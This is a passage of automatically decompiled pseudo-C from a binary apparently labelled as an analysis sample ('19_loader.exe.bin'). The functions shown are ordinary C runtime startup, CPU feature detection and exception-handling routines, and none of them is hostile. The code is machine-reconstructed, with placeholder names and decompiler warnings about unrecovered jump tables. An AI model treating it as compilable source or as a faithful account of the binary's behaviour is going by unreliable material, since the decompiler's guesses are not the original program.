      _DAT_1400e0740 = 0xffffffffffffffff;
      uRam00000001400e0748 = 0xffffffffffffffff;
      _DAT_1400e0750 = 0xffffffffffffffff;
    }
    else {
      in_RAX = FUN_14001552c(&DAT_1400e0728);
      if ((int)in_RAX != 0) {
LAB_1400140f3:
        return in_RAX & 0xffffffffffffff00;
      }
      in_RAX = FUN_14001552c((longlong *)&DAT_1400e0740);
      if ((int)in_RAX != 0) goto LAB_1400140f3;
    }
    DAT_1400e0721 = '\x01';
  }
  return CONCAT71((int7)(in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14150 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014150 rva=0x14150 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140014150(void)

{
  DWORD DVar1;
  _FILETIME local_res8;
  LARGE_INTEGER local_res10 [3];
  _FILETIME local_18 [2];
  
  if (DAT_1400dfc40 != 0x2b992ddfa232) {
    _DAT_1400dfc80 = ~DAT_1400dfc40;
    return;
  }
  local_res8.dwLowDateTime = 0;
  local_res8.dwHighDateTime = 0;
  GetSystemTimeAsFileTime(&local_res8);
  local_18[0] = local_res8;
  DVar1 = GetCurrentThreadId();
  local_18[0] = (_FILETIME)((ulonglong)local_18[0] ^ (ulonglong)DVar1);
  DVar1 = GetCurrentProcessId();
  local_18[0] = (_FILETIME)((ulonglong)local_18[0] ^ (ulonglong)DVar1);
  QueryPerformanceCounter(local_res10);
  DAT_1400dfc40 =
       (local_res10[0].QuadPart << 0x20 ^ local_res10[0].QuadPart ^ (ulonglong)local_18[0] ^
       (ulonglong)local_18) & 0xffffffffffff;
  if (DAT_1400dfc40 == 0x2b992ddfa232) {
    DAT_1400dfc40 = 0x2b992ddfa233;
  }
  _DAT_1400dfc80 = ~DAT_1400dfc40;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14210 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014210 rva=0x14210 */

undefined8 FUN_140014210(void)

{
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14220 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014220 rva=0x14220 */

undefined8 FUN_140014220(void)

{
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14230 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014230 rva=0x14230 */

undefined8 FUN_140014230(void)

{
  return 0x4000;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14240 | partial_markers_remain ===== */
/* address=140014240 rva=0x14240 */

void FUN_140014240(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140014247. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  InitializeSListHead(&DAT_1400e0760);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14250 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014250 rva=0x14250 */

undefined1 FUN_140014250(void)

{
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14260 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014260 rva=0x14260 */

void _guard_check_icall(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14270 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014270 rva=0x14270 */

void FUN_140014270(void)

{
  ulonglong *puVar1;
  
  puVar1 = (ulonglong *)FUN_140014290();
  *puVar1 = *puVar1 | 0x24;
  puVar1 = (ulonglong *)FUN_1400142a0();
  *puVar1 = *puVar1 | 2;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14290 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014290 rva=0x14290 */

undefined * FUN_140014290(void)

{
  return &DAT_1400e0770;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x142a0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400142a0 rva=0x142a0 */

undefined * FUN_1400142a0(void)

{
  return &DAT_1400e0778;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x142b0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400142b0 rva=0x142b0 */

bool FUN_1400142b0(void)

{
  return DAT_1400dfc14 == 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x142c0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400142c0 rva=0x142c0 */

undefined * FUN_1400142c0(void)

{
  return &DAT_1400e0780;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x142d0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400142d0 rva=0x142d0 */

undefined * FUN_1400142d0(void)

{
  return &DAT_1400e0788;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x142e0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400142e0 rva=0x142e0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400142e0(void)

{
  _DAT_1400e0790 = 0;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x142f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400142f0 rva=0x142f0 */

bool FUN_1400142f0(void)

{
  HMODULE pHVar1;
  longlong lVar2;
  
  pHVar1 = GetModuleHandleW((LPCWSTR)0x0);
  if ((((pHVar1 == (HMODULE)0x0) || ((short)pHVar1->unused != 0x5a4d)) ||
      (lVar2 = (longlong)pHVar1[0xf].unused, *(int *)((longlong)&pHVar1->unused + lVar2) != 0x4550))
     || ((*(short *)((longlong)&pHVar1[6].unused + lVar2) != 0x20b ||
         (*(uint *)((longlong)&pHVar1[0x21].unused + lVar2) < 0xf)))) {
    return false;
  }
  return *(int *)((longlong)&pHVar1[0x3e].unused + lVar2) != 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14350 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014350 rva=0x14350 */

undefined8 thunk_FUN_140014210(void)

{
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14360 | partial_markers_remain ===== */
/* address=140014360 rva=0x14360 */

void FUN_140014360(void)

{
                    /* WARNING: Could not recover jumptable at 0x000140014367. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  SetUnhandledExceptionFilter(FUN_140014380);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14370 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014370 rva=0x14370 */

void FUN_140014370(undefined4 param_1)

{
  code *pcVar1;
  
  pcVar1 = (code *)swi(0x29);
  (*pcVar1)(param_1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14380 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014380 rva=0x14380 */

undefined8 FUN_140014380(undefined8 *param_1)

{
  int *piVar1;
  undefined8 uVar2;
  undefined8 *puVar3;
  
  piVar1 = (int *)*param_1;
  if (((*piVar1 == -0x1f928c9d) && (piVar1[6] == 4)) &&
     ((piVar1[8] + 0xe66cfae0U < 3 || (piVar1[8] == 0x1994000)))) {
    puVar3 = (undefined8 *)FUN_140014a30();
    *puVar3 = piVar1;
    uVar2 = param_1[1];
    puVar3 = (undefined8 *)FUN_140014a50();
    *puVar3 = uVar2;
                    /* WARNING: Subroutine does not return */
    FUN_140015f5c();
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x143e0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400143e0 rva=0x143e0 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */
/* WARNING: Removing unreachable block (ram,0x000140014400) */
/* WARNING: Removing unreachable block (ram,0x000140014408) */
/* WARNING: Removing unreachable block (ram,0x00014001440e) */

void FUN_1400143e0(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14430 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014430 rva=0x14430 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */
/* WARNING: Removing unreachable block (ram,0x000140014450) */
/* WARNING: Removing unreachable block (ram,0x000140014458) */
/* WARNING: Removing unreachable block (ram,0x00014001445e) */

void FUN_140014430(void)

{
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14480 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014480 rva=0x14480 */

/* WARNING: Removing unreachable block (ram,0x000140014587) */
/* WARNING: Removing unreachable block (ram,0x000140014575) */
/* WARNING: Removing unreachable block (ram,0x000140014563) */
/* WARNING: Removing unreachable block (ram,0x00014001453c) */
/* WARNING: Removing unreachable block (ram,0x0001400144b7) */
/* WARNING: Removing unreachable block (ram,0x000140014492) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_140014480(void)

{
  int *piVar1;
  uint *puVar2;
  longlong lVar3;
  int iVar4;
  uint uVar5;
  ulonglong uVar6;
  byte bVar7;
  uint uVar8;
  ulonglong uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong in_XCR0;
  
  piVar1 = (int *)cpuid_basic_info(0);
  iVar4 = *piVar1;
  puVar2 = (uint *)cpuid_Version_info(1);
  uVar5 = puVar2[3];
  if ((piVar1[2] == 0x49656e69 && piVar1[3] == 0x6c65746e) && piVar1[1] == 0x756e6547) {
    uVar8 = *puVar2 & 0xfff3ff0;
    DAT_1400dfc90 = 0x8000;
    DAT_1400dfc98 = 0xffffffffffffffff;
    if ((((uVar8 == 0x106c0) || (uVar8 == 0x20660)) || (uVar8 == 0x20670)) ||
       ((uVar8 - 0x30650 < 0x21 &&
        ((0x100010001U >> ((ulonglong)(uVar8 - 0x30650) & 0x3f) & 1) != 0)))) {
      DAT_1400e0794 = DAT_1400e0794 | 1;
    }
  }
  uVar13 = 0;
  uVar8 = 0;
  uVar11 = 0;
  if (iVar4 < 7) {
    uVar12 = 0;
    uVar10 = 0;
  }
  else {
    piVar1 = (int *)cpuid_Extended_Feature_Enumeration_info(7);
    uVar12 = piVar1[1];
    uVar10 = piVar1[2];
    if ((uVar12 >> 9 & 1) != 0) {
      DAT_1400e0794 = DAT_1400e0794 | 2;
    }
    if (0 < *piVar1) {
      lVar3 = cpuid_Extended_Feature_Enumeration_info(7);
      uVar13 = *(uint *)(lVar3 + 8);
    }
    if (0x23 < iVar4) {
      lVar3 = cpuid(0x24);
      uVar8 = *(uint *)(lVar3 + 4);
    }
    if (0x28 < iVar4) {
      lVar3 = cpuid(0x29);
      uVar11 = *(uint *)(lVar3 + 4);
    }
  }
  DAT_1400dfc88 = 1;
  DAT_1400dfc8c = 2;
  uVar6 = DAT_1400dfca0 & 0xfffffffffffffffe;
  if ((uVar5 >> 0x14 & 1) != 0) {
    DAT_1400dfc88 = 2;
    DAT_1400dfc8c = 6;
    uVar6 = DAT_1400dfca0 & 0xffffffffffffffee;
  }
  DAT_1400dfca0 = uVar6;
  if ((uVar5 >> 0x1b & 1) == 0) {
    return 0;
  }
  uVar6 = xinuse(0);
  uVar9 = in_XCR0 & uVar6 & 0xffffffff;
  uVar6 = DAT_1400dfca0;
  if (((uVar5 >> 0x1c & 1) == 0) || (bVar7 = (byte)uVar9, (bVar7 & 6) != 6)) goto LAB_1400146f4;
  DAT_1400dfc88 = 3;
  uVar5 = DAT_1400dfc8c | 8;
  if ((uVar12 & 0x20) == 0) {
LAB_14001469a:
    DAT_1400dfca0 = uVar6;
    DAT_1400dfc8c = uVar5;
    uVar5 = DAT_1400dfc8c;
    uVar6 = DAT_1400dfca0;
  }
  else {
    DAT_1400dfc88 = 5;
    uVar5 = DAT_1400dfc8c | 0x28;
    uVar6 = DAT_1400dfca0 & 0xfffffffffffffffd;
    if ((uVar12 & 0xd0030000) == 0xd0030000) {
      if ((bVar7 & 0xe0) != 0xe0) goto LAB_14001469a;
      DAT_1400dfc8c = DAT_1400dfc8c | 0x68;
      DAT_1400dfc88 = 6;
      uVar5 = DAT_1400dfc8c;
      uVar6 = DAT_1400dfca0 & 0xffffffffffffffd9;
    }
  }
  DAT_1400dfca0 = uVar6;
  DAT_1400dfc8c = uVar5;
  if ((uVar10 >> 0x17 & 1) != 0) {
    DAT_1400dfca0 = DAT_1400dfca0 & 0xfffffffffeffffff;
  }
  uVar6 = DAT_1400dfca0;
  if (((uVar13 >> 0x13 & 1) != 0) && ((bVar7 & 0xe0) == 0xe0)) {
    _DAT_1400e0798 = uVar8 & 0xff;
    uVar6 = DAT_1400dfca0 & 0xfffffffffeffffd0;
    if (1 < _DAT_1400e0798) {
      uVar6 = DAT_1400dfca0 & 0xfffffffffeffff90;
    }
  }
LAB_1400146f4:
  DAT_1400dfca0 = uVar6;
  if ((((uVar13 >> 0x15 & 1) != 0) && ((uVar11 & 1) != 0)) && ((uVar9 >> 0x13 & 1) != 0)) {
    DAT_1400dfca0 = DAT_1400dfca0 & 0xffffffffffffff7f;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1448b | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001448b rva=0x1448b */

/* WARNING: Removing unreachable block (ram,0x000140014587) */
/* WARNING: Removing unreachable block (ram,0x000140014575) */
/* WARNING: Removing unreachable block (ram,0x000140014563) */
/* WARNING: Removing unreachable block (ram,0x00014001453c) */
/* WARNING: Removing unreachable block (ram,0x0001400144b7) */
/* WARNING: Removing unreachable block (ram,0x000140014492) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_14001448b(void)

{
  int *piVar1;
  uint *puVar2;
  longlong lVar3;
  int iVar4;
  uint uVar5;
  ulonglong uVar6;
  byte bVar7;
  uint uVar8;
  ulonglong uVar9;
  uint uVar10;
  uint uVar11;
  uint uVar12;
  uint uVar13;
  ulonglong in_XCR0;
  
  piVar1 = (int *)cpuid_basic_info(0);
  iVar4 = *piVar1;
  puVar2 = (uint *)cpuid_Version_info(1);
  uVar5 = puVar2[3];
  if ((piVar1[2] == 0x49656e69 && piVar1[3] == 0x6c65746e) && piVar1[1] == 0x756e6547) {
    uVar8 = *puVar2 & 0xfff3ff0;
    DAT_1400dfc90 = 0x8000;
    DAT_1400dfc98 = 0xffffffffffffffff;
    if ((((uVar8 == 0x106c0) || (uVar8 == 0x20660)) || (uVar8 == 0x20670)) ||
       ((uVar8 - 0x30650 < 0x21 &&
        ((0x100010001U >> ((ulonglong)(uVar8 - 0x30650) & 0x3f) & 1) != 0)))) {
      DAT_1400e0794 = DAT_1400e0794 | 1;
    }
  }
  uVar13 = 0;
  uVar8 = 0;
  uVar11 = 0;
  if (iVar4 < 7) {
    uVar12 = 0;
    uVar10 = 0;
  }
  else {
    piVar1 = (int *)cpuid_Extended_Feature_Enumeration_info(7);
    uVar12 = piVar1[1];
    uVar10 = piVar1[2];
    if ((uVar12 >> 9 & 1) != 0) {
      DAT_1400e0794 = DAT_1400e0794 | 2;
    }
    if (0 < *piVar1) {
      lVar3 = cpuid_Extended_Feature_Enumeration_info(7);
      uVar13 = *(uint *)(lVar3 + 8);
    }
    if (0x23 < iVar4) {
      lVar3 = cpuid(0x24);
      uVar8 = *(uint *)(lVar3 + 4);
    }
    if (0x28 < iVar4) {
      lVar3 = cpuid(0x29);
      uVar11 = *(uint *)(lVar3 + 4);
    }
  }
  DAT_1400dfc88 = 1;
  DAT_1400dfc8c = 2;
  uVar6 = DAT_1400dfca0 & 0xfffffffffffffffe;
  if ((uVar5 >> 0x14 & 1) != 0) {
    DAT_1400dfc88 = 2;
    DAT_1400dfc8c = 6;
    uVar6 = DAT_1400dfca0 & 0xffffffffffffffee;
  }
  DAT_1400dfca0 = uVar6;
  if ((uVar5 >> 0x1b & 1) == 0) {
    return 0;
  }
  uVar6 = xinuse(0);
  uVar9 = in_XCR0 & uVar6 & 0xffffffff;
  uVar6 = DAT_1400dfca0;
  if (((uVar5 >> 0x1c & 1) == 0) || (bVar7 = (byte)uVar9, (bVar7 & 6) != 6)) goto LAB_1400146f4;
  DAT_1400dfc88 = 3;
  uVar5 = DAT_1400dfc8c | 8;
  if ((uVar12 & 0x20) == 0) {
LAB_14001469a:
    DAT_1400dfca0 = uVar6;
    DAT_1400dfc8c = uVar5;
    uVar5 = DAT_1400dfc8c;
    uVar6 = DAT_1400dfca0;
  }
  else {
    DAT_1400dfc88 = 5;
    uVar5 = DAT_1400dfc8c | 0x28;
    uVar6 = DAT_1400dfca0 & 0xfffffffffffffffd;
    if ((uVar12 & 0xd0030000) == 0xd0030000) {
      if ((bVar7 & 0xe0) != 0xe0) goto LAB_14001469a;
      DAT_1400dfc8c = DAT_1400dfc8c | 0x68;
      DAT_1400dfc88 = 6;
      uVar5 = DAT_1400dfc8c;
      uVar6 = DAT_1400dfca0 & 0xffffffffffffffd9;
    }
  }
  DAT_1400dfca0 = uVar6;
  DAT_1400dfc8c = uVar5;
  if ((uVar10 >> 0x17 & 1) != 0) {
    DAT_1400dfca0 = DAT_1400dfca0 & 0xfffffffffeffffff;
  }
  uVar6 = DAT_1400dfca0;
  if (((uVar13 >> 0x13 & 1) != 0) && ((bVar7 & 0xe0) == 0xe0)) {
    _DAT_1400e0798 = uVar8 & 0xff;
    uVar6 = DAT_1400dfca0 & 0xfffffffffeffffd0;
    if (1 < _DAT_1400e0798) {
      uVar6 = DAT_1400dfca0 & 0xfffffffffeffff90;
    }
  }
LAB_1400146f4:
  DAT_1400dfca0 = uVar6;
  if ((((uVar13 >> 0x15 & 1) != 0) && ((uVar11 & 1) != 0)) && ((uVar9 >> 0x13 & 1) != 0)) {
    DAT_1400dfca0 = DAT_1400dfca0 & 0xffffffffffffff7f;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x145c3 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400145c3 rva=0x145c3 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_1400145c3(void)

{
  ulonglong uVar1;
  byte bVar2;
  ulonglong in_RAX;
  ulonglong uVar3;
  uint unaff_EBP;
  ulonglong unaff_RSI;
  uint unaff_EDI;
  uint in_R9D;
  uint in_R10D;
  byte unaff_R14B;
  ulonglong in_XCR0;
  
  DAT_1400dfca0 = in_RAX & 0xffffffffffffffef;
  DAT_1400dfc88 = 2;
  DAT_1400dfc8c = 6;
  if ((unaff_EDI >> 0x1b & 1) == 0) {
    DAT_1400dfc88 = 2;
    DAT_1400dfc8c = 6;
    return 0;
  }
  uVar1 = xinuse(0);
  uVar3 = in_XCR0 & uVar1 & 0xffffffff;
  uVar1 = DAT_1400dfca0;
  if (((unaff_EDI >> 0x1c & 1) != 0) && (bVar2 = (byte)uVar3, (bVar2 & 6) == 6)) {
    DAT_1400dfc88 = 3;
    DAT_1400dfc8c = 0xe;
    if ((in_R9D & 0x20) != 0) {
      DAT_1400dfc88 = 5;
      DAT_1400dfc8c = 0x2e;
      DAT_1400dfca0 = in_RAX & 0xffffffffffffffed;
      if (((in_R9D & 0xd0030000) == 0xd0030000) && ((bVar2 & 0xe0) == 0xe0)) {
        DAT_1400dfc8c = 0x6e;
        DAT_1400dfca0 = in_RAX & 0xffffffffffffffc9;
        DAT_1400dfc88 = 6;
      }
    }
    if ((unaff_EBP >> 0x17 & 1) != 0) {
      DAT_1400dfca0 = DAT_1400dfca0 & 0xfffffffffeffffff;
    }
    uVar1 = DAT_1400dfca0;
    if (((in_R10D >> 0x13 & 1) != 0) && ((bVar2 & 0xe0) == 0xe0)) {
      _DAT_1400e0798 = (uint)unaff_R14B;
      uVar1 = DAT_1400dfca0 & 0xfffffffffeffffd0;
      if (1 < _DAT_1400e0798) {
        uVar1 = DAT_1400dfca0 & 0xfffffffffeffff90;
      }
    }
  }
  DAT_1400dfca0 = uVar1;
  if ((((in_R10D >> 0x15 & 1) != 0) && ((unaff_RSI & 1) != 0)) && ((uVar3 >> 0x13 & 1) != 0)) {
    DAT_1400dfca0 = DAT_1400dfca0 & 0xffffffffffffff7f;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14730 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014730 rva=0x14730 */

bool FUN_140014730(void)

{
  return DAT_1400e079c != 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14740 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014740 rva=0x14740 */

undefined8 FUN_140014740(PEXCEPTION_RECORD param_1,PVOID param_2,longlong param_3,longlong *param_4)

{
  longlong lVar1;
  uint *puVar2;
  int iVar3;
  ulonglong uVar4;
  ulonglong uVar5;
  uint uVar6;
  ulonglong uVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  ulonglong uVar11;
  PEXCEPTION_RECORD local_58;
  longlong local_50;
  
  FUN_1400160c0(param_3);
  lVar1 = param_4[1];
  puVar2 = (uint *)param_4[7];
  uVar11 = *param_4 - lVar1;
  uVar9 = *(uint *)(param_4 + 9);
  if ((param_1->ExceptionFlags & 0x66) == 0) {
    local_58 = param_1;
    local_50 = param_3;
    if (uVar9 < *puVar2) {
      do {
        if (((puVar2[(ulonglong)uVar9 * 4 + 1] <= uVar11) &&
            (uVar11 < puVar2[(ulonglong)uVar9 * 4 + 2])) && (puVar2[(ulonglong)uVar9 * 4 + 4] != 0))
        {
          if (puVar2[(ulonglong)uVar9 * 4 + 3] != 1) {
            iVar3 = (*(code *)((ulonglong)puVar2[(ulonglong)uVar9 * 4 + 3] + lVar1))
                              (&local_58,param_2);
            if (iVar3 < 0) {
              return 0;
            }
            if (iVar3 < 1) goto LAB_14001485b;
          }
          if ((param_1->ExceptionCode == 0xe06d7363) &&
             (uVar4 = FUN_140016000(0x14008b5b0), (int)uVar4 != 0)) {
            FUN_140014960((int *)param_1);
          }
          FUN_140016080();
          RtlUnwindEx(param_2,(PVOID)((ulonglong)puVar2[(ulonglong)uVar9 * 4 + 4] + lVar1),param_1,
                      (PVOID)(ulonglong)param_1->ExceptionCode,(PCONTEXT)param_4[5],
                      (PUNWIND_HISTORY_TABLE)param_4[8]);
          FUN_1400160b0();
        }
LAB_14001485b:
        uVar9 = uVar9 + 1;
      } while (uVar9 < *puVar2);
    }
  }
  else {
    uVar10 = *puVar2;
    if (uVar9 < uVar10) {
      uVar4 = param_4[4] - lVar1;
      do {
        uVar5 = (ulonglong)uVar9;
        if ((puVar2[uVar5 * 4 + 1] <= uVar11) && (uVar11 < puVar2[uVar5 * 4 + 2])) {
          uVar8 = param_1->ExceptionFlags & 0x20;
          if (uVar8 != 0) {
            uVar7 = 0;
            if (uVar10 != 0) {
              do {
                if ((((puVar2[uVar7 * 4 + 1] <= uVar4) && (uVar4 < puVar2[uVar7 * 4 + 2])) &&
                    (puVar2[uVar7 * 4 + 4] == puVar2[uVar5 * 4 + 4])) &&
                   (puVar2[uVar7 * 4 + 3] == puVar2[uVar5 * 4 + 3])) break;
                uVar6 = (int)uVar7 + 1;
                uVar7 = (ulonglong)uVar6;
              } while (uVar6 < uVar10);
            }
            if ((uint)uVar7 != *puVar2) {
              return 1;
            }
          }
          if (puVar2[uVar5 * 4 + 4] == 0) {
            *(uint *)(param_4 + 9) = uVar9 + 1;
            (*(code *)((ulonglong)puVar2[uVar5 * 4 + 3] + lVar1))(1);
          }
          else if ((uVar4 == puVar2[uVar5 * 4 + 4]) && (uVar8 != 0)) {
            return 1;
          }
        }
        uVar10 = *puVar2;
        uVar9 = uVar9 + 1;
      } while (uVar9 < uVar10);
    }
  }
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14960 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014960 rva=0x14960 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140014960(int *param_1)

{
  byte *pbVar1;
  
  if ((((param_1 != (int *)0x0) && (*param_1 == -0x1f928c9d)) && (param_1[6] == 4)) &&
     ((param_1[8] + 0xe66cfae0U < 3 && (pbVar1 = *(byte **)(param_1 + 0xc), pbVar1 != (byte *)0x0)))
     ) {
    if (*(int *)(pbVar1 + 4) == 0) {
      if (((*pbVar1 & 0x10) != 0) && ((longlong *)**(longlong **)(param_1 + 10) != (longlong *)0x0))
      {
        (**(code **)(*(longlong *)**(longlong **)(param_1 + 10) + 0x10))();
      }
    }
    else {
      FUN_1400149e0(*(undefined8 *)(param_1 + 10),
                    (undefined *)((longlong)*(int *)(pbVar1 + 4) + *(longlong *)(param_1 + 0xe)));
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x149d0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400149d0 rva=0x149d0 */

void Unwind_1400149d0(void)

{
                    /* WARNING: Subroutine does not return */
  FUN_140015f5c();
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x149e0 | partial_markers_remain ===== */
/* address=1400149e0 rva=0x149e0 */

void FUN_1400149e0(undefined8 param_1,undefined *UNRECOVERED_JUMPTABLE)

{
                    /* WARNING: Could not recover jumptable at 0x0001400149e0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x149f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400149f0 rva=0x149f0 */

undefined8 FUN_1400149f0(longlong param_1)

{
  longlong *plVar1;
  PVOID pvVar2;
  
  pvVar2 = FUN_1400161f0();
  plVar1 = *(longlong **)((longlong)pvVar2 + 0x58);
  while( true ) {
    if (plVar1 == (longlong *)0x0) {
      return 1;
    }
    if (*plVar1 == param_1) break;
    plVar1 = (longlong *)plVar1[1];
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14a30 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014a30 rva=0x14a30 */

longlong FUN_140014a30(void)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_1400161f0();
  return (longlong)pvVar1 + 0x20;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14a50 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014a50 rva=0x14a50 */

longlong FUN_140014a50(void)

{
  PVOID pvVar1;
  
  pvVar1 = FUN_1400161f0();
  return (longlong)pvVar1 + 0x28;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14a70 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014a70 rva=0x14a70 */

longlong FUN_140014a70(longlong param_1,int *param_2)

{
  int iVar1;
  
  iVar1 = param_2[1];
  if (iVar1 < 0) {
    return *param_2 + param_1;
  }
  return (longlong)*(int *)((longlong)param_2[2] + *(longlong *)(iVar1 + param_1)) + (longlong)iVar1
         + *param_2 + param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14aa0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014aa0 rva=0x14aa0 */

undefined8 FUN_140014aa0(undefined8 *param_1)

{
  int iVar1;
  int *piVar2;
  undefined8 uVar3;
  PVOID pvVar4;
  
  piVar2 = (int *)*param_1;
  iVar1 = *piVar2;
  if ((iVar1 == -0x1fbcbcae) || (iVar1 == -0x1fbcb0b3)) {
    pvVar4 = FUN_1400161f0();
    if (0 < *(int *)((longlong)pvVar4 + 0x30)) {
      pvVar4 = FUN_1400161f0();
      *(int *)((longlong)pvVar4 + 0x30) = *(int *)((longlong)pvVar4 + 0x30) + -1;
    }
  }
  else if (iVar1 == -0x1f928c9d) {
    pvVar4 = FUN_1400161f0();
    *(int **)((longlong)pvVar4 + 0x20) = piVar2;
    uVar3 = param_1[1];
    pvVar4 = FUN_1400161f0();
    *(undefined8 *)((longlong)pvVar4 + 0x28) = uVar3;
                    /* WARNING: Subroutine does not return */
    FUN_140015f5c();
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14b10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014b10 rva=0x14b10 */

uint FUN_140014b10(longlong param_1,longlong param_2)

{
  byte bVar1;
  byte *pbVar2;
  longlong lVar3;
  
  if (param_1 != param_2) {
    pbVar2 = (byte *)(param_1 + 9);
    lVar3 = (param_2 + 9) - (longlong)pbVar2;
    do {
      bVar1 = *pbVar2;
      if (bVar1 != pbVar2[lVar3]) {
        return -(uint)(bVar1 < pbVar2[lVar3]) | 1;
      }
      pbVar2 = pbVar2 + 1;
    } while (bVar1 != 0);
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14b40 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014b40 rva=0x14b40 */

uint FUN_140014b40(void)

{
  uint uVar1;
  undefined4 uVar2;
  uint3 extraout_var;
  
  uVar1 = FUN_1400163c0();
  if ((char)uVar1 != '\0') {
    uVar2 = FUN_140016150();
    if ((char)uVar2 != '\0') {
      return CONCAT31((int3)((uint)uVar2 >> 8),1);
    }
    FUN_140016450();
    uVar1 = (uint)extraout_var << 8;
  }
  return uVar1 & 0xffffff00;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14b70 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014b70 rva=0x14b70 */

undefined1 FUN_140014b70(char param_1)

{
  if (param_1 == '\0') {
    FUN_1400161c0();
    FUN_140016450();
  }
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14ba4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014ba4 rva=0x14ba4 */

undefined8 FUN_140014ba4(void)

{
  undefined8 uVar1;
  
  FUN_14001552c((longlong *)&DAT_1400e0908);
  uVar1 = FUN_14001552c((longlong *)&DAT_1400e0920);
  return CONCAT71((int7)((ulonglong)uVar1 >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14bc8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014bc8 rva=0x14bc8 */

